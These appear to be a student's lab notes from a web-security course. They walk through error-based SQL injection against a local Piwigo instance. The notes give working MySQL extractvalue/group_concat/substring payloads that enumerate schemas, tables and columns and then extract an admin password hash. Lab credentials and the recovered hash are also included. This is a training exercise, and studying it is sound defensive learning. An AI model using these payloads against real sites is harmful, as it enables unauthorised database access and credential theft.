#### 8.5.1 Accessing Piwigo
```bash
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.50.105  piwigo
```

Let's start the virtual machine below and make the corresponding IP address update on our Kali machine before starting our work.

Piwigo takes a couple minutes to start and populate the database. If the application returns an error indicating it cannot connect to the database, the database has not been populated yet. Wait a few moments and refresh the page.
##### Labs
1. `PHP/7.4.15`
![[Pasted image 20240830114440.png]]
edit `/etc/hosts` file to IP address that is used for `piwigo`


browsing to `piwigo`
![[Pasted image 20240830114613.png]]
checking out `burp` request & profit
![[Pasted image 20240830114740.png]]

------------------
#### 8.5.2 Discovering the Vulnerable Parameters
While SQL injection vulnerabilities can occur anywhere an application interacts with a database, the vulnerability we will be reviewing is found in the authenticated section of the application. For this reason, we'll be attacking Piwigo as an authenticated user.

|Username|Password|URL|
|---|---|---|
|admin|password|http://piwigo/identification.php|

> Table 1 - Credentials for Piwigo

We will attempt to discover the vulnerability for ourselves and then craft a payload to extract data from the database. Before continuing, let's start Burp Suite, turn off Intercept if it is enabled, and open the embedded browser by clicking the _Open Browser_ button within the proxy tab.

Let's start by navigating to the page and logging in. After authenticating, we'll click on _Admin_ in the upper right-hand corner of the page.

![[Pasted image 20240830121913.png]]
At this point in a web application assessment, we would enumerate the application by completing a "walk through" in our browser (clicking through the menu options to search for interesting functionality) and then inspecting the requests and responses in Burp Suite.

![[Pasted image 20240830123140.png]]
For this case study, we'll find something interesting by clicking on _Users_ and then _Manage_.

When we check our HTTP history in Burp Suite, we will find that this page was loaded after a POST request that included many parameters in the POST body.

HTTP request and response for /admin/user_list_backend.php
![[Pasted image 20240830123515.png]]
There are a lot of URL-encoded fields in the POST body. Let's use Decoder to decode them. We will select the POST body by clicking at the start of the body, dragging our cursor to the end, and then right-clicking and selecting _Send to Decoder_.

![[Pasted image 20240830124553.png]]
Next, we'll click on _Decoder_. We can decode the text by clicking on _Decode as..._ and selecting _URL_. The decoded text will appear in a new text box.

![[Pasted image 20240830124705.png]]
As the decoded text is one long line, it can still be difficult to read. We have added line breaks in the excerpt below.
(Used chatgpt to make it pretty)
```d
draw=1
columns[0][data]=0
columns[0][name]=
columns[0][searchable]=true
columns[0][orderable]=true
columns[0][search][value]=
columns[0][search][regex]=false

columns[1][data]=1
columns[1][name]=
columns[1][searchable]=true
columns[1][orderable]=true
columns[1][search][value]=
columns[1][search][regex]=false

columns[2][data]=2
columns[2][name]=
columns[2][searchable]=true
columns[2][orderable]=true
columns[2][search][value]=
columns[2][search][regex]=false

columns[3][data]=3
columns[3][name]=
columns[3][searchable]=true
columns[3][orderable]=true
columns[3][search][value]=
columns[3][search][regex]=false

columns[4][data]=4
columns[4][name]=
columns[4][searchable]=true
columns[4][orderable]=true
columns[4][search][value]=
columns[4][search][regex]=false

columns[5][data]=5
columns[5][name]=
columns[5][searchable]=true
columns[5][orderable]=true
columns[5][search][value]=
columns[5][search][regex]=false

columns[6][data]=6
columns[6][name]=
columns[6][searchable]=true
columns[6][orderable]=true
columns[6][search][value]=
columns[6][search][regex]=false

order[0][column]=0
order[0][dir]=asc                               *******************
start=0                                         *******************
length=10                                       *******************
search[value]=
search[regex]=false

pwg_token=901aea9319abcdb5cf300733c523a8ad

```

Most of the field names sound interesting. Words like "columns" and "search" are enticing when we are searching for database-related functionality. If we want to test for potential SQL injection vulnerabilities, we could try adding a single quote to each value, but first, let's examine the values closer. Three parameters near the end of the POST body are very interesting: _order[0][dir]_, _start_, and _length_. A SQL query could use the value "asc" in an ORDER BY clause or use the _start_ and _length_ values to limit results.

Let's use Repeater to manually test these three fields. We'll return to the HTTP history tab by clicking on _Proxy_ > _HTTP history_. We can then right-click on the POST body and select _Send to Repeater_ from the context menu.

![[Pasted image 20240830125859.png]]

Next, let's click on _Repeater_. It is usually a good idea to have a baseline request and response to refer back to, so we'll click _Send_ before making any modifications.

Once we have the baseline response, we can start making changes to the request. We'll add a single quote (') to the `order[0]`, `[dir]`, `start`, and `length` values. However, without knowing the structure of the SQL query, we need to be careful using single quotes to test multiple fields for SQL injection so we don't accidentally create multiple closed strings, resulting in a technically valid query. Our goal is to cause an error in a SQL query by introducing an unbalanced or non-closed string.

If the application uses the _start_ and _length_ values to limit the results of a SQL query, the values are unlikely to be quoted in a query since they need to be numeric values. Likewise, the keywords for sorting results in a SQL query are not quoted. We can reasonably assume that injecting three single quotes will still cause an error if all three parameters are vulnerable. The first two single quotes will essentially cancel each other out by creating an enclosed string, leaving the third quote to start a new string that will hopefully be unbalanced and cause an error.


```bash
draw=2&columns%5B0%5D%5Bdata%5D=0&...order%5B0%5D%5Bcolumn%5D=3&order%5B0%5D%5Bdir%5D=asc'&start=0'&length=10'&search%5Bvalue%5D=&search%5Bregex%5D=false&pwg_token=5b670eff460389c20f48bf28c9cb2b7f
```

Let's send the modified request to the application by clicking _Send_ in Repeater. We receive an interesting response.

![[Pasted image 20240830131234.png]]

It seems the application has some input validation based on the error message. Since the message doesn't mention "asc", we'll leave the single quote there. Let's remove the single quote from the _start_ value and resend the request.

![[Pasted image 20240830131610.png]]

We receive the same error stating the _length_ parameter is not valid. Let's remove the single quote from the _length_ parameter. At this point, we only have a single quote in the _order[0][dir]_ parameter. Let's send the request again. The server still responds with an error message but this time, it includes the SQL statement that caused the error.

![[Pasted image 20240830132020.png]]

This message confirms we are injecting in to the ORDER BY clause. This means we won't be able to use a UNION-based payload, but we should be able to use an error-based payload. The error message also reveals the database is MySQL.

Since the database is MySQL and the application returns verbose error messages, let's try using an error-based payload with the _ExtractValue()_ function. Our first attempt will be to extract the database version. We'll need to URL-encode any spaces in our SQL payload by replacing them with plus signs (+), update the vulnerable parameter to `asc,+extractvalue('',concat('>',version()))`, and click _Send_.


![[Pasted image 20240830132624.png]]
Excellent. The server response includes the database version number. We have confirmed this parameter is vulnerable to SQL injection.
Before continuing to the next section, make sure to follow the steps above and confirm the SQL injection vulnerability.


----------------
#### 8.5.3. Exploiting Error-based SQL Injection
We have successfully identified that the _order[0][dir]_ parameter is vulnerable to SQL injection. Our next step is to work on data exfiltration. We know error-based payloads work so let's try using one to get the database names. Since the _ExtractValue()_ function can only handle sub-queries that return a single value, we'll have to get creative with our payload.

MySQL has many functions we can use to aggregate data values.[1](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/case-study-error-based-sqli-in-piwigo-31287/discovering-the-vulnerable-parameter-31054#fn-local_id_73-1) The _group_concat()_[2](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/case-study-error-based-sqli-in-piwigo-31287/discovering-the-vulnerable-parameter-31054#fn-local_id_73-2) function concatenates multiple values and returns a single string. This function will work perfectly with _extractvalue()_, which needs a single value.


**The _group_concat()_ function is unique to MySQL. Current versions of Microsoft SQL Server[3](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/case-study-error-based-sqli-in-piwigo-31287/discovering-the-vulnerable-parameter-31054#fn-local_id_73-3) and PostgreSQL[4](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/case-study-error-based-sqli-in-piwigo-31287/discovering-the-vulnerable-parameter-31054#fn-local_id_73-4) have a very similar _STRING_AGG()_ function. Additionally, current versions of Oracle DB have a _LISTAGG()_[5](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/case-study-error-based-sqli-in-piwigo-31287/discovering-the-vulnerable-parameter-31054#fn-local_id_73-5) function that is similar to the _STRING_AGG()_ functions.**

Let's use the _group_concat()_ function to extract the schema names from _information_schema.tables_ using the payload below, which includes line numbers and formatting for readability.
Using ExtractValue() with group_concat()
```sql
01  asc, extractvalue('',concat('>',(
02    select group_concat(table_schema) 
03    from (
04      select table_schema 
05      from information_schema.tables 
06      group by table_schema) 
07    as foo)
08    )
09  )
```
Let's start with the inner-most sub-query on lines 4 through 6. This sub-query selects the _table_schema_ column from _information_schema.tables_ and groups the results, returning each unique value only once. Lines 2 through 7 use the inner-most query as a table, using the _group_concat()_ function to aggregate the results into a single record. When we use a subquery in place of a table, MySQL requires an alias to use as a table name (line 7). Lines 1 and 9 take the result from the _group_concat()_ subquery, concatenate it with a greater-than symbol (>), and pass the resulting value to the _extractvalue()_ function.

Let's add our payload in Repeater. We'll need to URL-encode the spaces.

Without Lines
```sql
asc, extractvalue('',concat('>',(select group_concat(table_schema) from (select table_schema from information_schema.tables group by table_schema) as foo)))
```
Updating our payload in Repeater
- highlighted payload and clicked `CTRL+U` to change to url encoding
![[Pasted image 20240905205907.png]]
Next, we'll click _Send_. As expected, the server responds with an error.

```sql
:  [mysql error 1105] XPATH syntax error: '>information_schema,piwigo'

		SELECT SQL_CALC_FOUND_ROWS id, username, status, mail_address, recent_period, level, registration_date
		FROM   piwigo_users INNER JOIN piwigo_user_infos AS ui ON id = ui.user_id
		
		ORDER BY  id asc, extractvalue('',concat('>',(select group_concat(table_schema) from (select table_schema from information_schema.tables group by table_schema) as foo)))
		LIMIT 0, 10
   in <b>/piwigo/piwigo/include/dblayer/functions_mysqli.inc.php</b>
```
The error message includes the list of database schemas. The value "piwigo" matches the name of the application and likely contains the application-specific tables.

Now that we know the name of the schema used by the application, we can update our payload to extract table names. We'll need to instruct the subqueries to select the "table_name" column from _information_schema.tables_ and include a WHERE clause in the inner-most subquery to limit the results to the "piwigo" schema.

```sql
01  asc, extractvalue('',concat('>',(
02    select group_concat(table_schema) 
03    from (
04      select table_schema from information_schema.tables 
05      where table_schema='piwigo')
07    as foo)
08    )
09  )
```
without lines
```sql

asc, extractvalue('',concat('>',(select group_concat(table_name) from (select table_name from information_schema.tables where table_schema='piwigo') as foo)))
```
However, when we submit this payload to the server, we encounter an issue with the response.
![[Pasted image 20240905215938.png]]
While our payload worked, the output of the XPATH error only displays 32 characters. This hinders our ability to extract information, but we can adapt our payload to iterate through the potential values. In fact, the query we are injecting into has an example of the _LIMIT_[6](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/case-study-error-based-sqli-in-piwigo-31287/exploiting-error-based-sql-injection-31021#fn-local_id_73-6) syntax we want to copy. When used this way, the first number indicates how many records to skip and the second number indicates how many to return. The example from this query will return the first ten rows.

We can also use the _OFFSET_ keyword to specify the starting offset value along with a LIMIT. We'll use this syntax and update our payload to iterate through the table names:

```sql
asc, extractvalue('',concat('>',(
	select group_concat(table_name) 
	from (
		select table_name 
		from information_schema.tables 
		where table_schema='piwigo' 
		limit 2 offset 2) 
	as foo)
	)
)
```
one liner
```sql
asc, extractvalue('',concat('>',(select group_concat(table_name) from (select table_name from information_schema.tables where table_schema='piwigo' limit 2 offset 2) as foo)))
```

![[Pasted image 20240905220241.png]]
Since we are limiting the potential output to two tables at a time, we will need to submit this payload multiple times. Let's update the offset value each time to iterate through all potential table names. Much like we did while enumerating the web application, we're searching for any tables that might contain interesting or sensitive data. Eventually, we will identify the _piwigo_users_ table with an offset of 32.

![[Pasted image 20240905220415.png]]
The _piwigo_users_ table might contain passwords or other sensitive user information. Let's try to extract data from it. But first, we should query the database to learn what columns the table has. Before we change our payload, let's create a copy of it in Repeater by right-clicking on the request and selecting _Send to Repeater_. Let's switch to the new tab and update our payload to select the "column_name" column from the _columns_ table in the _information_schema_. We'll remove the LIMIT and OFFSET values for now as we can always add them back in.

```sql
asc, extractvalue('',concat('>',(
	select group_concat(column_name) 
	from (
		select column_name 
		from information_schema.columns 
		where table_schema='piwigo' and table_name='piwigo_users') 
	as foo)
	)
)
```
One liner
```sql
asc, extractvalue('',concat('>',(select group_concat(column_name) from (select column_name from information_schema.columns where table_schema='piwigo' and table_name='piwigo_users') as foo)))
```
When we submit the new payload to the application, we receive the following response.
![[Pasted image 20240905220721.png]]

The response values are truncated, but we were able to identify a "password" column. Now that we know the column names, we can start extracting data from the _piwigo_users_ table. Let's try to extract passwords. We don't know how long the password field is, but the XPATH syntax error limits output to 32 characters.

We can use the _SUBSTRING()_[7](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/case-study-error-based-sqli-in-piwigo-31287/exploiting-error-based-sql-injection-31021#fn-local_id_73-7) function to work around this limit. This function takes three parameters: the column name, the starting point, and the length or number of characters to return.

**Microsoft SQL Server has a nearly identical _SUBSTRING()_[8](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/case-study-error-based-sqli-in-piwigo-31287/exploiting-error-based-sql-injection-31021#fn-local_id_73-8) function and Oracle DB has a _SUBSTR()_[9](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/case-study-error-based-sqli-in-piwigo-31287/exploiting-error-based-sql-injection-31021#fn-local_id_73-9) function that takes the same parameters. PostgreSQL has two different functions for substrings.[10](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/case-study-error-based-sqli-in-piwigo-31287/exploiting-error-based-sql-injection-31021#fn-local_id_73-10) The MySQL _SUBSTRING()_ function follows the same parameter format as the _SUBSTR()_ function. The _SUBSTRING()_ function must include a _from_ or _for_ keyword in the function call.**


Since we're targeting a new table, let's create another copy in Repeater and switch to the new tab before modifying the payload. We can keep our requests organized in Repeater by using different tabs for each logical attack.

Let's update our payload to select a 32 character substring from the "password" column. We will reintroduce a LIMIT clause so we can control which row to extract, but we can remove the _group_concat()_ function since we'll be extracting one record at a time.

##### Labs

1. `$P$Ghxmchgk.0YxEQutC7os3dZfBvqGIz/`
![[Pasted image 20240905223418.png]]
```sql
asc, extractvalue('',concat('>',(select substring(password,1,32) from piwigo_users limit 1 offset 0)))
```
First part of Hash `$P$Ghxmchgk.0YxEQutC7os3dZfBvqG`
![[Pasted image 20240905221049.png]]

Our payload worked and we have obtained part of a password value. The "$P$" characters at the start of the password indicate this is a password _hash_.[11](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/case-study-error-based-sqli-in-piwigo-31287/exploiting-error-based-sql-injection-31021#fn-local_id_73-11) We'll need to update our query to extract the next 32 characters to get the full password hash.

While we cannot use a password hash directly to further our access to this application, we have proven that we can use error-based SQL injection payloads to access any data in the database by working around character-based limits.



Going to Modify the `password,1,32` field with small increments to gain the full hash

First part of Hash `$P$Ghxmchgk.0YxEQutC7os3dZfBvqG`
![[Pasted image 20240905221804.png]]
with 1 is above screenshot
`$P$Ghxmchgk.0YxEQutC7os3dZfBvqG`

with 5
`hxmchgk.0YxEQutC7os3dZfBvqGIz/`
![[Pasted image 20240905223305.png]]
with 10 - didnt change from 5
`gk.0YxEQutC7os3dZfBvqGIz/`
![[Pasted image 20240905223328.png]]
Added them together to make complete hash
full `$P$Ghxmchgk.0YxEQutC7os3dZfBvqGIz/`